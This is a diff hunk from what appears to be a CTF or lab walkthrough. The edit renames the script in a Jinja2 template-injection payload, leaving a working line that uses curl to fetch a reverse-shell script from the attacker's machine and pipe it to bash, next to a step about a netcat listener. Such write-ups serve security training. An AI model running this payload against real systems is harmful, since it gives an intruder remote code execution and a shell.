@@ -345,7 +345,7 @@ This attempt failed due to the presence of an illegal character (&). Another pay
 
 **Step 3**. curl reverse_shell.sh from our server.
 
-	\{\{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+<machine ip>:8888/ex.sh+|+bash").read()+\}\} 
+	\{\{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+<machine ip>:8888/reverse_shell.sh+|+bash").read()+\}\} 
 
 **Step 4**. start a netcat listener to retrieve reverse_shell connection. 
 
